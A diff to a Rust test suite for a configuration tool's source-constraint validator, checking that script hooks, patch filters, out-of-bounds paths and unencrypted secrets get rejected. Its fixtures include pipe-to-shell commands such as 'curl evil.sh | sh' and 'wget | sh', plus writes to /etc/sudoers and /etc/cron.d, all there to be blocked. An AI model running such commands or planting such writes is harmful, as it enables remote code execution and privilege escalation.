@@ -71,6 +71,7 @@ fn make_source_input(name: &str, priority: u32) -> CompositionInput {
             },
             locked: PolicyItems {
                 files: vec![ManagedFileSpec {
+                    patch: None,
                     source: "security/policy.yaml".into(),
                     target: "~/.config/company/security-policy.yaml".into(),
                     strategy: None,
@@ -216,7 +217,7 @@ fn validate_constraints_scripts_blocked() {
         }),
         ..Default::default()
     };
-    let err = validate_constraints("acme", &constraints, &spec, false).unwrap_err();
+    let err = collect_constraint_violations("acme", &constraints, &spec, false).remove(0);
     let msg = err.to_string();
     assert!(
         msg.contains("acme") && msg.contains("scripts"),
@@ -264,7 +265,7 @@ fn validate_constraints_scripts_blocked_all_hooks() {
         ),
     ] {
         assert!(
-            validate_constraints("src", &constraints, &spec, false).is_err(),
+            !collect_constraint_violations("src", &constraints, &spec, false).is_empty(),
             "no_scripts should block {label} hooks"
         );
     }
@@ -282,7 +283,7 @@ fn validate_constraints_scripts_empty_allowed() {
         ..Default::default()
     };
     assert!(
-        validate_constraints("acme", &constraints, &spec, false).is_ok(),
+        collect_constraint_violations("acme", &constraints, &spec, false).is_empty(),
         "no_scripts with empty script lists should pass"
     );
 }
@@ -300,7 +301,7 @@ fn validate_constraints_scripts_allowed() {
         }),
         ..Default::default()
     };
-    assert!(validate_constraints("acme", &constraints, &spec, false).is_ok());
+    assert!(collect_constraint_violations("acme", &constraints, &spec, false).is_empty());
 }
 
 #[test]
@@ -319,10 +320,318 @@ fn validate_constraints_scripts_permitted_by_subscriber_opt_in() {
         ..Default::default()
     };
     // Blocked without opt-in, permitted with it.
-    assert!(validate_constraints("acme", &constraints, &spec, false).is_err());
+    assert!(!collect_constraint_violations("acme", &constraints, &spec, false).is_empty());
     assert!(
-        validate_constraints("acme", &constraints, &spec, true).is_ok(),
+        collect_constraint_violations("acme", &constraints, &spec, true).is_empty(),
         "allowScripts opt-in must permit profile-layer scripts under no_scripts"
+    );
+}
+
+/// A `spec.backups[]` entry with only the required fields filled in.
+fn backup_fixture(name: &str) -> BackupSpec {
+    BackupSpec {
+        name: name.to_string(),
+        source: "~/notes".into(),
+        destination: None,
+        name_pattern: "{filename}.{timestamp}".to_string(),
+        schedule: None,
+        retention: 3,
+        pre_backup: Vec::new(),
+        post_backup: Vec::new(),
+    }
+}
+
+/// A `strategy: Patch` managed file whose merge is computed by running
+/// `script`.
+fn patch_script_file_fixture(target: &str, script: &str) -> ManagedFileSpec {
+    ManagedFileSpec {
+        patch: Some(PatchSpec {
+            format: None,
+            ensure: None,
+            script: Some(script.to_string()),
+            blocked_by: None,
+        }),
+        source: String::new(),
+        target: target.into(),
+        strategy: Some(FileStrategy::Patch),
+        private: false,
+        origin: None,
+        encryption: None,
+        permissions: None,
+    }
+}
+
+#[test]
+fn validate_constraints_blocks_backup_hooks() {
+    // A backup hook runs on `cfgd apply`, on `cfgd backup run`, and on the
+    // daemon's timer — code execution by any other name.
+    let constraints = SourceConstraints {
+        no_scripts: true,
+        ..Default::default()
+    };
+    for (label, spec) in [
+        (
+            "preBackup",
+            ProfileSpec {
+                backups: vec![BackupSpec {
+                    pre_backup: vec![ScriptEntry::Simple("curl evil.sh | sh".into())],
+                    ..backup_fixture("keys")
+                }],
+                ..Default::default()
+            },
+        ),
+        (
+            "postBackup",
+            ProfileSpec {
+                backups: vec![BackupSpec {
+                    post_backup: vec![ScriptEntry::Simple("curl evil.sh | sh".into())],
+                    ..backup_fixture("keys")
+                }],
+                ..Default::default()
+            },
+        ),
+    ] {
+        let mut found = collect_constraint_violations("acme", &constraints, &spec, false);
+        assert!(!found.is_empty(), "no_scripts must block a {label} hook");
+        let err = found.remove(0);
+        let msg = err.to_string();
+        assert!(
+            msg.contains("acme") && msg.contains(label) && msg.contains("keys"),
+            "the error must name the source, the hook, and the backup: {msg}"
+        );
+        assert!(
+            collect_constraint_violations("acme", &constraints, &spec, true).is_empty(),
+            "allowScripts opt-in must permit a {label} hook"
+        );
+    }
+}
+
+#[test]
+fn validate_constraints_blocks_a_patch_filter_script() {
+    // A patch filter is the widest surface of the three: the merge is computed
+    // by running it, so `cfgd diff` / `status` / `verify` execute it too.
+    let constraints = SourceConstraints {
+        no_scripts: true,
+        ..Default::default()
+    };
+    let spec = ProfileSpec {
+        files: Some(FilesSpec {
+            managed: vec![patch_script_file_fixture(
+                "~/.config/app/x.ini",
+                "curl evil.sh | sh",
+            )],
+            ..Default::default()
+        }),
+        ..Default::default()
+    };
+
+    let err = collect_constraint_violations("acme", &constraints, &spec, false).remove(0);
+    let msg = err.to_string();
+    assert!(
+        msg.contains("acme") && msg.contains("patch script") && msg.contains("~/.config/app/x.ini"),
+        "the error must name the source and the patched target: {msg}"
+    );
+    assert!(
+        collect_constraint_violations("acme", &constraints, &spec, true).is_empty(),
+        "allowScripts opt-in must permit a patch filter"
+    );
+}
+
+/// One profile layer contributed by source `acme`, carrying `spec`.
+fn source_layer(spec: ProfileSpec) -> ProfileLayer {
+    ProfileLayer {
+        source: "acme".to_string(),
+        profile_name: "default".to_string(),
+        priority: 500,
+        policy: LayerPolicy::Required,
+        spec,
+    }
+}
+
+/// The `blocked_by` marker on the first managed file of `layers`.
+fn first_block(layers: &[ProfileLayer]) -> Option<String> {
+    layers[0].spec.files.as_ref()?.managed[0]
+        .patch
+        .as_ref()?
+        .blocked_by
+        .clone()
+}
+
+#[test]
+fn report_mode_records_every_violation_a_source_commits() {
+    // The read path degrades BOTH barred files, so a warning naming only the
+    // first would disagree with the per-file output printed under it.
+    let local = make_local_profile();
+    let two_barred_filters = || CompositionInput {
+        constraints: SourceConstraints {
+            no_scripts: true,
+            ..Default::default()
+        },
+        layers: vec![source_layer(ProfileSpec {
+            files: Some(FilesSpec {
+                managed: vec![
+                    patch_script_file_fixture("~/.config/app/a.ini", "curl | sh"),
+                    patch_script_file_fixture("~/.config/app/b.ini", "wget | sh"),
+                ],
+                ..Default::default()
+            }),
+            ..Default::default()
+        })],
+        policy: ConfigSourcePolicy::default(),
+        ..make_source_input("acme", 500)
+    };
+
+    let reported = compose(&local, &[two_barred_filters()], ConstraintMode::Report).unwrap();
+    let named: Vec<&str> = reported
+        .constraint_violations
+        .iter()
+        .map(|v| v.detail.as_str())
+        .collect();
+    assert_eq!(
+        named.len(),
+        2,
+        "both barred filters must be reported: {named:?}"
+    );
+    assert!(
+        named.iter().any(|d| d.contains("a.ini")) && named.iter().any(|d| d.contains("b.ini")),
+        "each reported violation must name its own file: {named:?}"
+    );
+
+    // Enforce still aborts on the first one — it never reaches the second.
+    let err = compose(&local, &[two_barred_filters()], ConstraintMode::Enforce)
+        .expect_err("Enforce must abort on a barred filter");
+    assert!(err.to_string().contains("a.ini"), "{err}");
+}
+
+#[test]
+fn block_barred_scripts_poisons_a_patch_filter_the_source_may_not_run() {
+    // Report mode keeps a violating source's contribution so the read can
+    // still render it, but a patch filter is executed by that very read. The
+    // marker leaves the file visible and makes the filter unrunnable.
+    let constraints = SourceConstraints {
+        no_scripts: true,
+        ..Default::default()
+    };
+    let mut layers = vec![source_layer(ProfileSpec {
+        files: Some(FilesSpec {
+            managed: vec![patch_script_file_fixture(
+                "~/.config/app/x.ini",
+                "curl | sh",
+            )],
+            ..Default::default()
+        }),
+        ..Default::default()
+    })];
+
+    block_barred_scripts("acme", &constraints, false, &mut layers);
+
+    assert_eq!(first_block(&layers).as_deref(), Some("acme"));
+    assert!(
+        layers[0].spec.files.as_ref().unwrap().managed[0]
+            .patch
+            .as_ref()
+            .unwrap()
+            .script
+            .is_some(),
+        "the filter is marked, not dropped — the file stays describable"
+    );
+}
+
+#[test]
+fn block_barred_scripts_leaves_a_permitted_filter_runnable() {
+    let permissive = SourceConstraints {
+        no_scripts: false,
+        ..Default::default()
+    };
+    let strict = SourceConstraints {
+        no_scripts: true,
+        ..Default::default()
+    };
+    let layer = source_layer(ProfileSpec {
+        files: Some(FilesSpec {
+            managed: vec![patch_script_file_fixture("~/.config/app/x.ini", "cat")],
+            ..Default::default()
+        }),
+        ..Default::default()
+    });
+
+    for (label, constraints, allow_scripts) in [
+        ("the source permits scripts", &permissive, false),
+        ("the subscriber opted in", &strict, true),
+    ] {
+        let mut layers = vec![layer.clone()];
+        block_barred_scripts("acme", constraints, allow_scripts, &mut layers);
+        assert_eq!(first_block(&layers), None, "no marker when {label}");
+    }
+}
+
+#[test]
+fn validate_constraints_allows_a_structured_patch_without_a_script() {
+    // `patch.ensure` is a declarative merge, not code — `noScripts` has no
+    // business rejecting it.
+    let constraints = SourceConstraints {
+        no_scripts: true,
+        ..Default::default()
+    };
+    let spec = ProfileSpec {
+        files: Some(FilesSpec {
+            managed: vec![ManagedFileSpec {
+                patch: Some(PatchSpec {
+                    format: None,
+                    ensure: Some(serde_yaml::from_str("telemetry: false").unwrap()),
+                    script: None,
+                    blocked_by: None,
+                }),
+                ..patch_script_file_fixture("~/.config/app/x.ini", "unused")
+            }],
+            ..Default::default()
+        }),
+        ..Default::default()
+    };
+    assert!(collect_constraint_violations("acme", &constraints, &spec, false).is_empty());
+}
+
+#[test]
+fn validate_constraints_path_containment_covers_backup_destinations() {
+    let constraints = SourceConstraints {
+        allowed_target_paths: vec!["~/.config/acme/".into()],
+        ..Default::default()
+    };
+    let spec = ProfileSpec {
+        backups: vec![BackupSpec {
+            destination: Some("/etc/cron.d".into()),
+            ..backup_fixture("keys")
+        }],
+        ..Default::default()
+    };
+    let err = collect_constraint_violations("acme", &constraints, &spec, false).remove(0);
+    let msg = err.to_string();
+    assert!(
+        msg.contains("/etc/cron.d") && msg.contains("acme"),
+        "error should name the offending destination and source: {msg}"
+    );
+}
+
+#[test]
+fn validate_constraints_leaves_the_backup_source_unconstrained() {
+    // Reading a path the allow-list does not cover is the feature's primary
+    // use (`~/.ssh` before a risky apply). The snapshot can only land inside a
+    // `destination`, which IS constrained — here, the default one under the
+    // state dir.
+    let constraints = SourceConstraints {
+        allowed_target_paths: vec!["~/.config/acme/".into()],
+        ..Default::default()
+    };
+    let spec = ProfileSpec {
+        backups: vec![BackupSpec {
+            source: "~/.ssh".into(),
+            ..backup_fixture("keys")
+        }],
+        ..Default::default()
+    };
+    assert!(
+        collect_constraint_violations("acme", &constraints, &spec, false).is_empty(),
+        "a backup's source is a read, not a write, and stays unconstrained"
     );
 }
 
@@ -335,6 +644,7 @@ fn validate_constraints_path_containment() {
     let spec = ProfileSpec {
         files: Some(FilesSpec {
             managed: vec![ManagedFileSpec {
+                patch: None,
                 source: "evil.sh".into(),
                 target: "/etc/sudoers".into(),
                 strategy: None,
@@ -347,7 +657,7 @@ fn validate_constraints_path_containment() {
         }),
         ..Default::default()
     };
-    let err = validate_constraints("acme", &constraints, &spec, false).unwrap_err();
+    let err = collect_constraint_violations("acme", &constraints, &spec, false).remove(0);
     let msg = err.to_string();
     assert!(
         msg.contains("/etc/sudoers") && msg.contains("acme"),
@@ -364,6 +674,7 @@ fn validate_constraints_path_allowed() {
     let spec = ProfileSpec {
         files: Some(FilesSpec {
             managed: vec![ManagedFileSpec {
+                patch: None,
                 source: "config.yaml".into(),
                 target: "~/.config/acme/config.yaml".into(),
                 strategy: None,
@@ -376,7 +687,7 @@ fn validate_constraints_path_allowed() {
         }),
         ..Default::default()
     };
-    assert!(validate_constraints("acme", &constraints, &spec, false).is_ok());
+    assert!(collect_constraint_violations("acme", &constraints, &spec, false).is_empty());
 }
 
 #[test]
@@ -389,7 +700,7 @@ fn validate_constraints_system_changes_blocked() {
         system: HashMap::from([("shell".into(), serde_yaml::Value::String("/bin/zsh".into()))]),
         ..Default::default()
     };
-    let err = validate_constraints("acme", &constraints, &spec, false).unwrap_err();
+    let err = collect_constraint_violations("acme", &constraints, &spec, false).remove(0);
     let msg = err.to_string();
     assert!(
         msg.contains("acme") && msg.contains("system setting") && msg.contains("shell"),
@@ -408,7 +719,7 @@ fn validate_constraints_system_changes_allowed() {
         system: HashMap::from([("shell".into(), serde_yaml::Value::String("/bin/zsh".into()))]),
         ..Default::default()
     };
-    assert!(validate_constraints("acme", &constraints, &spec, false).is_ok());
+    assert!(collect_constraint_violations("acme", &constraints, &spec, false).is_empty());
 }
 
 #[test]
@@ -566,6 +877,7 @@ fn required_resource_cannot_be_overridden() {
         policy: ConfigSourcePolicy {
             required: PolicyItems {
                 files: vec![ManagedFileSpec {
+                    patch: None,
                     source: "corp/policy.yaml".into(),
                     target: "~/.config/policy.yaml".into(),
                     strategy: None,
@@ -593,6 +905,7 @@ fn required_resource_cannot_be_overridden() {
         policy: ConfigSourcePolicy {
             recommended: PolicyItems {
                 files: vec![ManagedFileSpec {
+                    patch: None,
                     source: "rogue/policy.yaml".into(),
                     target: "~/.config/policy.yaml".into(),
                     strategy: None,
@@ -630,6 +943,7 @@ fn file_conflict_between_sources_records_resolution() {
         policy: ConfigSourcePolicy {
             recommended: PolicyItems {
                 files: vec![ManagedFileSpec {
+                    patch: None,
                     source: "alpha/tool.conf".into(),
                     target: "~/.config/tool.conf".into(),
                     strategy: None,
@@ -656,6 +970,7 @@ fn file_conflict_between_sources_records_resolution() {
         policy: ConfigSourcePolicy {
             recommended: PolicyItems {
                 files: vec![ManagedFileSpec {
+                    patch: None,
                     source: "beta/tool.conf".into(),
                     target: "~/.config/tool.conf".into(),
                     strategy: None,
@@ -706,6 +1021,7 @@ fn equal_priority_file_conflict_is_unresolvable() {
         policy: ConfigSourcePolicy {
             recommended: PolicyItems {
                 files: vec![ManagedFileSpec {
+                    patch: None,
                     source: "team-a/settings.json".into(),
                     target: "~/.config/settings.json".into(),
                     strategy: None,
@@ -732,6 +1048,7 @@ fn equal_priority_file_conflict_is_unresolvable() {
         policy: ConfigSourcePolicy {
             recommended: PolicyItems {
                 files: vec![ManagedFileSpec {
+                    patch: None,
                     source: "team-b/settings.json".into(),
                     target: "~/.config/settings.json".into(),
                     strategy: None,
@@ -878,6 +1195,7 @@ fn make_file_spec_with_encryption(target: &str, backend: Option<&str>) -> Profil
     ProfileSpec {
         files: Some(FilesSpec {
             managed: vec![ManagedFileSpec {
+                patch: None,
                 source: "source/file".into(),
                 target: target.into(),
                 strategy: None,
@@ -899,9 +1217,9 @@ fn make_file_spec_with_encryption(target: &str, backend: Option<&str>) -> Profil
 fn encryption_required_target_without_encryption_is_error() {
     let constraints = make_encryption_constraint(&["~/.ssh/*"], None);
     let spec = make_file_spec_with_encryption("~/.ssh/id_rsa", None);
-    let result = validate_constraints("corp", &constraints, &spec, false);
-    assert!(result.is_err());
-    let msg = result.unwrap_err().to_string();
+    let mut result = collect_constraint_violations("corp", &constraints, &spec, false);
+    assert!(!result.is_empty());
+    let msg = result.remove(0).to_string();
     assert!(msg.contains("~/.ssh/id_rsa"), "msg: {msg}");
     assert!(msg.contains("~/.ssh/*"), "msg: {msg}");
     assert!(msg.contains("encryption"), "msg: {msg}");
@@ -911,7 +1229,7 @@ fn encryption_required_target_without_encryption_is_error() {
 fn encryption_required_target_with_encryption_passes() {
     let constraints = make_encryption_constraint(&["~/.ssh/*"], None);
     let spec = make_file_spec_with_encryption("~/.ssh/id_rsa", Some("sops"));
-    assert!(validate_constraints("corp", &constraints, &spec, false).is_ok());
+    assert!(collect_constraint_violations("corp", &constraints, &spec, false).is_empty());
 }
 
 #[test]
@@ -919,7 +1237,7 @@ fn encryption_non_matching_target_without_encryption_passes() {
     let constraints = make_encryption_constraint(&["~/.ssh/*"], None);
     // ~/.zshrc does not match ~/.ssh/* — no enforcement
     let spec = make_file_spec_with_encryption("~/.zshrc", None);
-    assert!(validate_constraints("corp", &constraints, &spec, false).is_ok());
+    assert!(collect_constraint_violations("corp", &constraints, &spec, false).is_empty());
 }
 
 #[test]
@@ -934,7 +1252,7 @@ fn encryption_empty_required_targets_no_enforcement() {
     };
     // Even though a backend is specified, empty requiredTargets means no enforcement
     let spec = make_file_spec_with_encryption("~/.ssh/id_rsa", None);
-    assert!(validate_constraints("corp", &constraints, &spec, false).is_ok());
+    assert!(collect_constraint_violations("corp", &constraints, &spec, false).is_empty());
 }
 
 #[test]
@@ -942,16 +1260,16 @@ fn encryption_no_constraint_field_no_enforcement() {
     let constraints = SourceConstraints::default();
     // No encryption constraint at all
     let spec = make_file_spec_with_encryption("~/.ssh/id_rsa", None);
-    assert!(validate_constraints("corp", &constraints, &spec, false).is_ok());
+    assert!(collect_constraint_violations("corp", &constraints, &spec, false).is_empty());
 }
 
 #[test]
 fn encryption_wrong_backend_is_error() {
     let constraints = make_encryption_constraint(&["~/.aws/*"], Some("sops"));
     let spec = make_file_spec_with_encryption("~/.aws/credentials", Some("age"));
-    let result = validate_constraints("corp", &constraints, &spec, false);
-    assert!(result.is_err());
-    let msg = result.unwrap_err().to_string();
+    let mut result = collect_constraint_violations("corp", &constraints, &spec, false);
+    assert!(!result.is_empty());
+    let msg = result.remove(0).to_string();
     assert!(msg.contains("~/.aws/credentials"), "msg: {msg}");
     assert!(msg.contains("age"), "msg: {msg}");
     assert!(msg.contains("sops"), "msg: {msg}");
@@ -961,7 +1279,7 @@ fn encryption_wrong_backend_is_error() {
 fn encryption_correct_backend_passes() {
     let constraints = make_encryption_constraint(&["~/.aws/*"], Some("sops"));
     let spec = make_file_spec_with_encryption("~/.aws/credentials", Some("sops"));
-    assert!(validate_constraints("corp", &constraints, &spec, false).is_ok());
+    assert!(collect_constraint_violations("corp", &constraints, &spec, false).is_empty());
 }
 
 #[test]
@@ -969,11 +1287,11 @@ fn encryption_constraint_matches_exact_path() {
     let constraints = make_encryption_constraint(&["~/.gnupg/secring.gpg"], None);
     // Exact path match
     let spec = make_file_spec_with_encryption("~/.gnupg/secring.gpg", None);
-    let result = validate_constraints("corp", &constraints, &spec, false);
-    assert!(result.is_err());
+    let mut result = collect_constraint_violations("corp", &constraints, &spec, false);
+    assert!(!result.is_empty());
     assert!(
         result
-            .unwrap_err()
+            .remove(0)
             .to_string()
             .contains("~/.gnupg/secring.gpg")
     );
@@ -1226,6 +1544,7 @@ fn higher_priority_source_wins_file_content() {
         policy: ConfigSourcePolicy {
             recommended: PolicyItems {
                 files: vec![ManagedFileSpec {
+                    patch: None,
                     source: "low/gitconfig".into(),
                     target: "~/.gitconfig".into(),
                     strategy: None,
@@ -1252,6 +1571,7 @@ fn higher_priority_source_wins_file_content() {
         policy: ConfigSourcePolicy {
             recommended: PolicyItems {
                 files: vec![ManagedFileSpec {
+                    patch: None,
                     source: "high/gitconfig".into(),
                     target: "~/.gitconfig".into(),
                     strategy: None,
@@ -1711,6 +2031,7 @@ fn policy_items_to_spec_converts_all_fields() {
             ..Default::default()
         }),
         files: vec![ManagedFileSpec {
+            patch: None,
             source: "f.yaml".into(),
             target: "~/.config/f.yaml".into(),
             strategy: None,
@@ -1769,6 +2090,7 @@ fn check_locked_violations_no_conflict() {
 fn check_locked_violations_detects_override() {
     let locked = PolicyItems {
         files: vec![ManagedFileSpec {
+            patch: None,
             source: "corp/policy.yaml".into(),
             target: "~/.config/policy.yaml".into(),
             strategy: None,
@@ -1781,7 +2103,8 @@ fn check_locked_violations_detects_override() {
     };
     let mut merged = MergedProfile::default();
     merged.files.managed.push(ManagedFileSpec {
-        source: "local/override.yaml".into(),   // different source
+        patch: None,
+        source: "local/override.yaml".into(), // different source
         target: "~/.config/policy.yaml".into(), // same target
         strategy: None,
         private: false,
@@ -1800,6 +2123,7 @@ fn check_locked_violations_detects_override() {
 fn check_locked_violations_same_source_is_ok() {
     let locked = PolicyItems {
         files: vec![ManagedFileSpec {
+            patch: None,
             source: "corp/policy.yaml".into(),
             target: "~/.config/policy.yaml".into(),
             strategy: None,
@@ -1812,6 +2136,7 @@ fn check_locked_violations_same_source_is_ok() {
     };
     let mut merged = MergedProfile::default();
     merged.files.managed.push(ManagedFileSpec {
+        patch: None,
         source: "corp/policy.yaml".into(), // same source
         target: "~/.config/policy.yaml".into(),
         strategy: None,
@@ -1861,6 +2186,7 @@ fn detect_permission_changes_locked_items_increased() {
         policy: ConfigSourcePolicy {
             locked: PolicyItems {
                 files: vec![ManagedFileSpec {
+                    patch: None,
                     source: "new-lock.yaml".into(),
                     target: "~/.lock".into(),
                     strategy: None,
@@ -1997,6 +2323,7 @@ fn count_policy_tier_items_comprehensive() {
             ..Default::default()
         }),
         files: vec![ManagedFileSpec {
+            patch: None,
             source: "s".into(),
             target: "t".into(),
             strategy: None,
@@ -2402,6 +2729,7 @@ fn validate_constraints_encryption_mode_mismatch() {
     let spec = ProfileSpec {
         files: Some(FilesSpec {
             managed: vec![ManagedFileSpec {
+                patch: None,
                 source: "key".into(),
                 target: "~/.ssh/id_rsa".into(),
                 strategy: None,
@@ -2417,9 +2745,9 @@ fn validate_constraints_encryption_mode_mismatch() {
         }),
         ..Default::default()
     };
-    let result = validate_constraints("corp", &constraints, &spec, false);
-    assert!(result.is_err());
-    let msg = result.unwrap_err().to_string();
+    let mut result = collect_constraint_violations("corp", &constraints, &spec, false);
+    assert!(!result.is_empty());
+    let msg = result.remove(0).to_string();
     assert!(
         msg.contains("mode"),
         "expected mode mismatch error, got: {msg}"
@@ -2466,6 +2794,7 @@ fn compose_file_origins_tagged_for_source_files() {
             spec: ProfileSpec {
                 files: Some(FilesSpec {
                     managed: vec![ManagedFileSpec {
+                        patch: None,
                         source: "corp/tool.conf".into(),
                         target: "~/.config/tool.conf".into(),
                         strategy: None,
@@ -2746,6 +3075,7 @@ fn compose_opted_in_optional_profile_out_of_bounds_path_rejected() {
             spec: ProfileSpec {
                 files: Some(FilesSpec {
                     managed: vec![ManagedFileSpec {
+                        patch: None,
                         source: "evil.sh".into(),
                         target: "/etc/sudoers".into(),
                         strategy: None,
@@ -2810,6 +3140,7 @@ fn encryption_module_file_matching_required_target_without_encryption_is_error()
             managed: vec![
                 // First file does NOT match the pattern — OK
                 ManagedFileSpec {
+                    patch: None,
                     source: "files/.zshrc".into(),
                     target: "~/.zshrc".into(),
                     strategy: None,
@@ -2820,6 +3151,7 @@ fn encryption_module_file_matching_required_target_without_encryption_is_error()
                 },
                 // Second file MATCHES the pattern and has no encryption — error
                 ManagedFileSpec {
+                    patch: None,
                     source: "files/api-key".into(),
                     target: "~/.config/secrets/api-key".into(),
                     strategy: None,
@@ -2833,9 +3165,9 @@ fn encryption_module_file_matching_required_target_without_encryption_is_error()
         }),
         ..Default::default()
     };
-    let result = validate_constraints("corp", &constraints, &spec, false);
-    assert!(result.is_err());
-    let msg = result.unwrap_err().to_string();
+    let mut result = collect_constraint_violations("corp", &constraints, &spec, false);
+    assert!(!result.is_empty());
+    let msg = result.remove(0).to_string();
     assert!(msg.contains("~/.config/secrets/api-key"), "msg: {msg}");
 }
 
@@ -2859,6 +3191,7 @@ fn unwrap_composition_err(err: crate::errors::CfgdError) -> crate::errors::Compo
 fn composition_error_variant_locked_resource() {
     let locked = PolicyItems {
         files: vec![ManagedFileSpec {
+            patch: None,
             source: "corp/policy.yaml".into(),
             target: "~/.config/policy.yaml".into(),
             strategy: None,
@@ -2871,6 +3204,7 @@ fn composition_error_variant_locked_resource() {
     };
     let mut merged = MergedProfile::default();
     merged.files.managed.push(ManagedFileSpec {
+        patch: None,
         source: "local/override.yaml".into(),
         target: "~/.config/policy.yaml".into(),
         strategy: None,
@@ -2896,6 +3230,7 @@ fn composition_error_variant_required_resource() {
         policy: ConfigSourcePolicy {
             required: PolicyItems {
                 files: vec![ManagedFileSpec {
+                    patch: None,
                     source: "corp/policy.yaml".into(),
                     target: "~/.config/policy.yaml".into(),
                     strategy: None,
@@ -2922,6 +3257,7 @@ fn composition_error_variant_required_resource() {
         policy: ConfigSourcePolicy {
             recommended: PolicyItems {
                 files: vec![ManagedFileSpec {
+                    patch: None,
                     source: "rogue/policy.yaml".into(),
                     target: "~/.config/policy.yaml".into(),
                     strategy: None,
@@ -2965,6 +3301,7 @@ fn composition_error_variant_path_not_allowed() {
     let spec = ProfileSpec {
         files: Some(FilesSpec {
             managed: vec![ManagedFileSpec {
+                patch: None,
                 source: "evil.sh".into(),
                 target: "/etc/sudoers".into(),
                 strategy: None,
@@ -2977,7 +3314,7 @@ fn composition_error_variant_path_not_allowed() {
         }),
         ..Default::default()
     };
-    let err = validate_constraints("acme", &constraints, &spec, false).unwrap_err();
+    let err = collect_constraint_violations("acme", &constraints, &spec, false).remove(0);
     let inner = unwrap_composition_err(err);
     assert!(matches!(
         inner,
@@ -2998,7 +3335,7 @@ fn composition_error_variant_scripts_not_allowed() {
         }),
         ..Default::default()
     };
-    let err = validate_constraints("acme", &constraints, &spec, false).unwrap_err();
+    let err = collect_constraint_violations("acme", &constraints, &spec, false).remove(0);
     let inner = unwrap_composition_err(err);
     assert!(matches!(
         inner,
@@ -3016,7 +3353,7 @@ fn composition_error_variant_system_change_not_allowed() {
         system: HashMap::from([("shell".into(), serde_yaml::Value::String("/bin/zsh".into()))]),
         ..Default::default()
     };
-    let err = validate_constraints("acme", &constraints, &spec, false).unwrap_err();
+    let err = collect_constraint_violations("acme", &constraints, &spec, false).remove(0);
     let inner = unwrap_composition_err(err);
     assert!(matches!(
         inner,
@@ -3033,6 +3370,7 @@ fn composition_error_variant_unresolvable_conflict() {
         policy: ConfigSourcePolicy {
             recommended: PolicyItems {
                 files: vec![ManagedFileSpec {
+                    patch: None,
                     source: "team-a/settings.json".into(),
                     target: "~/.config/settings.json".into(),
                     strategy: None,
@@ -3059,6 +3397,7 @@ fn composition_error_variant_unresolvable_conflict() {
         policy: ConfigSourcePolicy {
             recommended: PolicyItems {
                 files: vec![ManagedFileSpec {
+                    patch: None,
                     source: "team-b/settings.json".into(),
                     target: "~/.config/settings.json".into(),
                     strategy: None,
@@ -3092,7 +3431,7 @@ fn composition_error_variant_unresolvable_conflict() {
 fn composition_error_variant_encryption_required() {
     let constraints = make_encryption_constraint(&["~/.ssh/*"], None);
     let spec = make_file_spec_with_encryption("~/.ssh/id_rsa", None);
-    let err = validate_constraints("corp", &constraints, &spec, false).unwrap_err();
+    let err = collect_constraint_violations("corp", &constraints, &spec, false).remove(0);
     let inner = unwrap_composition_err(err);
     assert!(matches!(
         inner,
@@ -3104,7 +3443,7 @@ fn composition_error_variant_encryption_required() {
 fn composition_error_variant_encryption_backend_mismatch() {
     let constraints = make_encryption_constraint(&["~/.aws/*"], Some("sops"));
     let spec = make_file_spec_with_encryption("~/.aws/credentials", Some("age"));
-    let err = validate_constraints("corp", &constraints, &spec, false).unwrap_err();
+    let err = collect_constraint_violations("corp", &constraints, &spec, false).remove(0);
     let inner = unwrap_composition_err(err);
     assert!(matches!(
         inner,
@@ -3125,6 +3464,7 @@ fn composition_error_variant_encryption_mode_mismatch() {
     let spec = ProfileSpec {
         files: Some(FilesSpec {
             managed: vec![ManagedFileSpec {
+                patch: None,
                 source: "key".into(),
                 target: "~/.ssh/id_rsa".into(),
                 strategy: None,
@@ -3140,7 +3480,7 @@ fn composition_error_variant_encryption_mode_mismatch() {
         }),
         ..Default::default()
     };
-    let err = validate_constraints("corp", &constraints, &spec, false).unwrap_err();
+    let err = collect_constraint_violations("corp", &constraints, &spec, false).remove(0);
     let inner = unwrap_composition_err(err);
     assert!(matches!(
         inner,
@@ -3491,6 +3831,7 @@ fn compose_rejects_policy_tier_file_outside_allowed_paths() {
         policy: ConfigSourcePolicy {
             locked: PolicyItems {
                 files: vec![ManagedFileSpec {
+                    patch: None,
                     source: "evil.sh".into(),
                     target: "/etc/sudoers".into(),
                     strategy: None,
@@ -3533,6 +3874,7 @@ fn compose_rejects_required_tier_file_outside_allowed_paths() {
         policy: ConfigSourcePolicy {
             required: PolicyItems {
                 files: vec![ManagedFileSpec {
+                    patch: None,
                     source: "rc".into(),
                     target: "/etc/profile.d/corp.sh".into(),
                     strategy: None,
@@ -3575,6 +3917,7 @@ fn compose_rejects_local_override_of_locked_resource() {
         merged: MergedProfile {
             files: FilesSpec {
                 managed: vec![ManagedFileSpec {
+                    patch: None,
                     source: "local/policy.yaml".into(),
                     target: "~/.config/company/security-policy.yaml".into(),
                     strategy: None,
@@ -3594,6 +3937,7 @@ fn compose_rejects_local_override_of_locked_resource() {
         policy: ConfigSourcePolicy {
             locked: PolicyItems {
                 files: vec![ManagedFileSpec {
+                    patch: None,
                     source: "corp/policy.yaml".into(),
                     target: "~/.config/company/security-policy.yaml".into(),
                     strategy: None,
@@ -3670,6 +4014,7 @@ fn compose_accepts_compliant_source() {
         policy: ConfigSourcePolicy {
             required: PolicyItems {
                 files: vec![ManagedFileSpec {
+                    patch: None,
                     source: "corp/policy.yaml".into(),
                     target: "~/.config/corp/policy.yaml".into(),
                     strategy: None,
@@ -3866,6 +4211,7 @@ fn compose_report_mode_visits_every_source() {
         policy: ConfigSourcePolicy {
             locked: PolicyItems {
                 files: vec![ManagedFileSpec {
+                    patch: None,
                     source: "x".into(),
                     target: "/etc/sudoers".into(),
                     strategy: None,
